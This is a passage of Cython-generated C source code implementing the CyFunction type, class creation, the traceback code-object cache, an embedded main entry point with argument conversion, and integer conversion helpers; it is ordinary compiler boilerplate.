    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CalculateMetaclass */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

/* Py3ClassCreate */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
